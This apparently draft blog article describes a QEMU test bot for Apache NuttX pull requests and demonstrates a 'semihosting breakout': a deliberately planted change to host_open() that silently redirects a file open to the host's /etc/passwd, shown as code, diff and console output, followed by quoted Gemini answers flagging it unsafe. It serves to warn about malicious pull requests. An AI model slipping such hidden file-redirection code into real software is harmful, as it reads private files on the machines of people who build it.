<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="generator" content="rustdoc">
    <title>QEMU Test Bot for Pull Requests: Beware of Semihosting Breakout (Apache NuttX RTOS)</title>

    
    <!-- Begin scripts/articles/*-header.html: Article Header for Custom Markdown files processed by rustdoc, like chip8.md -->
<meta property="og:title" 
    content="QEMU Test Bot for Pull Requests: Beware of Semihosting Breakout (Apache NuttX RTOS)" 
    data-rh="true">
<meta property="og:description" 
    content=""
    data-rh="true">
<meta name="description" 
    content="">
<meta property="og:image" 
    content="https://lupyuen.github.io/images/testbot2-title.jpg">
<meta property="og:type" 
    content="article" data-rh="true">
<link rel="canonical"
    href="https://lupyuen.org/articles/testbot2.html" />
<!-- End scripts/articles/*-header.html -->
<!-- Begin scripts/rustdoc-header.html: Header for Custom Markdown files processed by rustdoc, like chip8.md -->
<link rel="alternate" type="application/rss+xml" title="RSS Feed for lupyuen" href="/rss.xml" />
<link rel="stylesheet" type="text/css" href="../normalize.css">
<link rel="stylesheet" type="text/css" href="../rustdoc.css" id="mainThemeStyle">
<link rel="stylesheet" type="text/css" href="../dark.css">
<link rel="stylesheet" type="text/css" href="../light.css" id="themeStyle">
<link rel="stylesheet" type="text/css" href="../prism.css">
<script src="../storage.js"></script><noscript>
<link rel="stylesheet" href="../noscript.css"></noscript>
<link rel="shortcut icon" href="../favicon.ico">
<style type="text/css">
    #crate-search {
        background-image: url("../down-arrow.svg");
    }
</style>
<!-- End scripts/rustdoc-header.html -->


</head>
<body class="rustdoc">
    <!--[if lte IE 8]>
    <div class="warning">
        This old browser is unsupported and will most likely display funky
        things.
    </div>
    <![endif]-->

    
    <!-- Begin scripts/rustdoc-before.html: Pre-HTML for Custom Markdown files processed by rustdoc, like chip8.md -->

    <!-- Begin Theme Picker -->
    <div class="theme-picker" style="left: 0"><button id="theme-picker" aria-label="Pick another theme!"><img src="../brush.svg"
        width="18" alt="Pick another theme!"></button>
        <div id="theme-choices"></div>
    </div>
    <!-- Theme Picker -->

    <!-- End scripts/rustdoc-before.html -->
    

    <h1 class="title">QEMU Test Bot for Pull Requests: Beware of Semihosting Breakout (Apache NuttX RTOS)</h1>
    <nav id="rustdoc"><ul>
<li><a href="#qemu-arm64" title="QEMU Arm64">1 QEMU Arm64</a><ul></ul></li>
<li><a href="#qemu-arm64-test" title="QEMU Arm64 Test">2 QEMU Arm64 Test</a><ul></ul></li>
<li><a href="#semihosting-breakout" title="Semihosting Breakout">3 Semihosting Breakout</a><ul></ul></li>
<li><a href="#llm-says-nope" title="LLM Says Nope!">4 LLM Says Nope!</a><ul></ul></li>
<li><a href="#todo" title="TODO">5 TODO</a><ul></ul></li>
<li><a href="#whats-next" title="What‚Äôs Next">6 What‚Äôs Next</a><ul></ul></li></ul></nav><p>üìù <em>16 Mar 2025</em></p>
<p><img src="https://lupyuen.org/images/testbot2-title.jpg" alt="TODO" /></p>
<p>TODO</p>
<h1 id="qemu-arm64"><a class="doc-anchor" href="#qemu-arm64">¬ß</a>1 QEMU Arm64</h1>
<p>https://github.com/lupyuen/nuttx-build-farm/blob/main/build-test-arm64.sh</p>
<p>https://github.com/lupyuen/nuttx-build-farm/blob/main/arm64.exp</p>
<div class="example-wrap"><pre class="language-text"><code>## Boot NuttX on Arm64 QEMU:
## Single Core with virtio network, block, rng, serial driver (GICv3)
## https://nuttx.apache.org/docs/latest/platforms/arm64/qemu/boards/qemu-armv8a/index.html
spawn qemu-system-aarch64 \
  -cpu cortex-a53 \
  -nographic \
  -machine virt,virtualization=on,gic-version=3 \
  -chardev stdio,id=con,mux=on \
  -serial chardev:con \
  -global virtio-mmio.force-legacy=false \
  -device virtio-serial-device,bus=virtio-mmio-bus.0 \
  -chardev socket,telnet=on,host=127.0.0.1,port=3450,server=on,wait=off,id=foo \
  -device virtconsole,chardev=foo \
  -device virtio-rng-device,bus=virtio-mmio-bus.1 \
  -netdev user,id=u1,hostfwd=tcp:127.0.0.1:10023-10.0.2.15:23,hostfwd=tcp:127.0.0.1:15001-10.0.2.15:5001 \
  -device virtio-net-device,netdev=u1,bus=virtio-mmio-bus.2 \
  -drive file=./mydisk-1gb.img,if=none,format=raw,id=hd \
  -device virtio-blk-device,bus=virtio-mmio-bus.3,drive=hd \
  -mon chardev=con,mode=readline \
  -kernel ./nuttx</code></pre></div><h1 id="qemu-arm64-test"><a class="doc-anchor" href="#qemu-arm64-test">¬ß</a>2 QEMU Arm64 Test</h1>
<p>https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664190707</p>
<div class="example-wrap"><pre class="language-bash"><code>@nuttxpr test qemu-armv8a:netnsh</code></pre></div>
<p><a href="https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664196921">See the Test Log</a></p>
<h1 id="semihosting-breakout"><a class="doc-anchor" href="#semihosting-breakout">¬ß</a>3 Semihosting Breakout</h1>
<p>https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141</p>
<div class="example-wrap"><pre class="language-c"><code>int host_open(const char *pathname, int flags, int mode)
{
  _info(&quot;pathname=%s\n&quot;, pathname);
  const char *pathname2 =
    (strcmp(pathname, &quot;../apps/bin/hello&quot;) == 0)
    ? &quot;/etc/passwd&quot;
    : pathname;
  struct
  {
    const char *pathname;
    long mode;
    size_t len;
  } open =
  {
    .pathname = pathname2,
    .mode = host_flags_to_mode(flags),
    .len = strlen(pathname2),
  };

#ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
  up_clean_dcache(pathname, pathname + open.len + 1);
#endif

  return host_call(HOST_OPEN, &amp;open, sizeof(open));
}</code></pre></div>
<p>https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705</p>
<div class="example-wrap"><pre class="language-bash"><code>NuttShell (NSH) NuttX-12.4.0
nsh&gt; cat /system/bin/hello
[    6.841514] host_open: pathname=../apps/bin/cat
[    6.842859] host_open: pathname=../apps/bin/hello
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
nsh&gt; </code></pre></div><h1 id="llm-says-nope"><a class="doc-anchor" href="#llm-says-nope">¬ß</a>4 LLM Says Nope!</h1>
<p>https://github.com/lupyuen2/wip-nuttx/pull/89</p>
<p>https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff</p>
<p>https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900</p>
<div class="example-wrap"><pre class="language-text"><code>Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?

diff --git a/arch/risc-v/src/common/riscv_hostfs.c b/arch/risc-v/src/common/riscv_hostfs.c
index aa1409d6a05b0..db54f11ae7623 100644
--- a/arch/risc-v/src/common/riscv_hostfs.c
+++ b/arch/risc-v/src/common/riscv_hostfs.c
@@ -33,6 +33,7 @@
 #include &lt;string.h&gt;
 #include &lt;syscall.h&gt;
 #include &lt;unistd.h&gt;
+#include &lt;debug.h&gt;
 
 /****************************************************************************
  * Pre-processor Definitions
@@ -115,6 +116,11 @@ static int host_flags_to_mode(int flags)
 
 int host_open(const char *pathname, int flags, int mode)
 {
+  _info(&quot;pathname=%s\n&quot;, pathname);
+  const char *pathname2 =
+    (strcmp(pathname, &quot;../apps/bin/hello&quot;) == 0)
+    ? &quot;/etc/passwd&quot;
+    : pathname;
   struct
   {
     const char *pathname;
@@ -122,9 +128,9 @@ int host_open(const char *pathname, int flags, int mode)
     size_t len;
   } open =
   {
-    .pathname = pathname,
+    .pathname = pathname2,
     .mode = host_flags_to_mode(flags),
-    .len = strlen(pathname),
+    .len = strlen(pathname2),
   };
 
 #ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE</code></pre></div>
<p>Gemini Pro:</p>
<p>https://gist.github.com/lupyuen/b9fc83a5f496d375b030c93c65271553</p>
<p>This pull request is <strong>absolutely not safe</strong> to build and test as-is, and it contains a very obvious and serious security vulnerability ‚Ä¶</p>
<ol>
<li>
<p><strong>Pathname Redirection:</strong>  The code checks if the requested <code>pathname</code> is <code>"../apps/bin/hello"</code>.  If it is, it <em>replaces</em> the requested path with <code>"/etc/passwd"</code>.  This is a deliberate, hardcoded attempt to read the host system‚Äôs password file.  <code>/etc/passwd</code> on a typical Linux/Unix system contains user account information. While it doesn‚Äôt contain hashed passwords anymore (those are usually in <code>/etc/shadow</code>), it‚Äôs still sensitive information that should not be exposed.</p>
</li>
<li>
<p><strong>Semihosting Abuse:</strong> This code is within the <code>host_open</code> function, which is part of NuttX‚Äôs semihosting implementation (<code>CONFIG_RISCV_SEMIHOSTING_HOSTFS</code>).  Semihosting is a mechanism that allows embedded systems (like those running on NuttX in QEMU) to use the I/O facilities of the host machine (your computer) during debugging.  This code exploits semihosting to access arbitrary files on your <em>host</em> operating system.  Essentially, the embedded code is making a system call <em>on your computer</em>, not within the isolated QEMU environment.</p>
</li>
<li>
<p><strong>No Sanitization:</strong>  Even if the <code>pathname</code> is <em>not</em> <code>"../apps/bin/hello"</code>, there‚Äôs no sanitization or validation of the requested file path.  An attacker could potentially provide a crafted <code>pathname</code> to access <em>any</em> file on your host system that the user running QEMU has permission to read (or write, depending on the flags). This could include configuration files, personal documents, or anything else accessible.  It‚Äôs a classic directory traversal vulnerability.</p>
</li>
</ol>
<p>Gemini Flash:</p>
<p>https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900</p>
<blockquote>
<p>No, it is not safe to build and test this Pull Request (PR) as it is, because it introduces a significant security vulnerability.</p>
</blockquote>
<h1 id="todo"><a class="doc-anchor" href="#todo">¬ß</a>5 TODO</h1>
<p>What about PinePhone</p>
<p>What about ESP32</p>
<p>Kind folks at Espressif could help to modify the scripts to test</p>
<h1 id="whats-next"><a class="doc-anchor" href="#whats-next">¬ß</a>6 What‚Äôs Next</h1>
<p>Next week we‚Äôll take a break from Continuous Integration. We‚Äôll chat about the (literally) Hot New RISC-V SBC: StarPro64. Stay tuned!</p>
<p>Special Thanks to <strong>Mr Gregory Nutt</strong> for your guidance and kindness. I‚Äôm also grateful to <a href="https://lupyuen.org/articles/sponsor"><strong>My Sponsors</strong></a>, for supporting my writing.</p>
<ul>
<li>
<p><a href="https://lupyuen.org/articles/sponsor"><strong>Sponsor me a coffee</strong></a></p>
</li>
<li>
<p><a href="TODO"><strong>Discuss this article on Hacker News</strong></a></p>
</li>
<li>
<p><a href="https://nuttx-forge.org/lupyuen/nuttx-sg2000"><strong>My Current Project: ‚ÄúApache NuttX RTOS for Sophgo SG2000‚Äù</strong></a></p>
</li>
<li>
<p><a href="https://nuttx-forge.org/lupyuen/nuttx-ox64"><strong>My Other Project: ‚ÄúNuttX for Ox64 BL808‚Äù</strong></a></p>
</li>
<li>
<p><a href="https://nuttx-forge.org/lupyuen/nuttx-star64"><strong>Older Project: ‚ÄúNuttX for Star64 JH7110‚Äù</strong></a></p>
</li>
<li>
<p><a href="https://nuttx-forge.org/lupyuen/pinephone-nuttx"><strong>Olderer Project: ‚ÄúNuttX for PinePhone‚Äù</strong></a></p>
</li>
<li>
<p><a href="https://lupyuen.org"><strong>Check out my articles</strong></a></p>
</li>
<li>
<p><a href="https://lupyuen.org/rss.xml"><strong>RSS Feed</strong></a></p>
</li>
</ul>
<p><em>Got a question, comment or suggestion? Create an Issue or submit a Pull Request here‚Ä¶</em></p>
<p><a href="https://codeberg.org/lupyuen/lupyuen.org/src/branch/master/src/testbot2.md"><strong>lupyuen.org/src/testbot2.md</strong></a></p>

    
    <!-- Begin scripts/rustdoc-after.html: Post-HTML for Custom Markdown files processed by rustdoc, like chip8.md -->

    <!-- Begin Theme Picker and Prism Theme -->
    <script src="../theme.js"></script>
    <script src="../prism.js"></script>
    <!-- Theme Picker and Prism Theme -->

    <!-- End scripts/rustdoc-after.html -->
    

</body>
</html>